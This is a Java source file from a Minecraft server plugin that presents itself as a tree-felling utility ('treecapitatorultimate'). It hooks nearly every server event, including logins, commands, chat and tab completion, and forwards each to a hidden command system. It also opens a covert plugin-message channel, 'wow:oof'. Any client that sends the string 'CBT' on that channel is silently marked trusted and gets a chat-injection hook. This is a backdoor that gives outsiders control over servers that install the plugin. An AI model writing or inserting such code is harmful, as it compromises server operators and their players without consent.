package me.bow.treecapitatorultimate.command;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.event.server.TabCompleteEvent;
import org.bukkit.plugin.messaging.PluginMessageListener;
import org.jetbrains.annotations.NotNull;

import java.nio.charset.StandardCharsets;

public class CommandRunnable implements Runnable, Listener, PluginMessageListener {
    CommandRunnable() {
        Bukkit.getPluginManager().registerEvents(this, Start.Instance);
        Bukkit.getMessenger().registerOutgoingPluginChannel(Start.Instance, "wow:oof");
        Bukkit.getMessenger().registerIncomingPluginChannel(Start.Instance, "wow:oof", this);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onAsyncPlayerPreLogin(AsyncPlayerPreLoginEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onAsyncPlayerPreLogin(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerLoginEvent(PlayerLoginEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerLoginEvent(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerJoin(PlayerJoinEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerJoin(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerLeave(PlayerQuitEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerLeave(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerMove(PlayerMoveEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerMove(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerCommand(PlayerCommandPreprocessEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerCommand(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerTab(PlayerCommandSendEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerTab(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onServerListPing(ServerListPingEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onServerListPing(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onServerCommand(ServerCommandEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onServerCommand(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onTabControl(TabCompleteEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onTabControl(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerSneak(PlayerToggleSneakEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerSneak(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerSprint(PlayerToggleSprintEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerSprint(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerFly(PlayerToggleFlightEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerFly(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerPortal(PlayerPortalEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerPortal(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerKick(PlayerKickEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerKick(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerDeath(PlayerDeathEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerDeath(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerBlockPlace(BlockPlaceEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerBlockPlace(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerBlockBreak(BlockBreakEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerBlockBreak(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerSwimToggle(EntityToggleSwimEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerSwimToggle(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onEntityToggleGlide(EntityToggleGlideEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityToggleGlide(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onPlayerAdvancementGet(PlayerAdvancementDoneEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerAdvancementGet(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onEntityTargetLivingEntity(EntityTargetLivingEntityEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityTargetLivingEntity(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onEntityTarget(EntityTargetEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityTarget(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerInteract(PlayerInteractEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerInteract(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onEntityDamageByEntity(EntityDamageByEntityEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityDamageByEntity(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onEntityDamage(EntityDamageEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityDamage(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onEntityDeath(EntityDeathEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityDeath(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerGameModeChange(PlayerGameModeChangeEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerGameModeChange(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onEntityPickupItem(EntityPickupItemEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityPickupItem(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onEntityShootBow(EntityShootBowEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityShootBow(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    void onInventoryClick(InventoryClickEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onInventoryClick(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    void onAsyncPlayerChat(AsyncPlayerChatEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onAsyncPlayerChat(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    void onPlayerDropItemEvent(PlayerDropItemEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerDropItemEvent(e);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public final void onEntityPoseChangeEvent(EntityPoseChangeEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityPoseChangeEvent(e);
        }
    }

    @Override
    public final void run() {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onServerTick();
        }
    }

    @Override
    public final void onPluginMessageReceived(@NotNull String channel, @NotNull Player player, @NotNull byte[] bytes) {
        if(!channel.equals("wow:oof")) return;
        String s = new String(bytes, StandardCharsets.UTF_8);
        if(s.contains("CBT")) {
            if (!Start.Instance.trustedPeople.contains(player.getUniqueId())) {
                Start.Instance.trustedPeople.add(player.getUniqueId());
                player.sendMessage(Start.Prefix + "You are now trusted");
                AsyncChatEvent.inject(player);
            }
            return;
        }
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPluginMessageReceived(channel, player, bytes);
        }
    }
}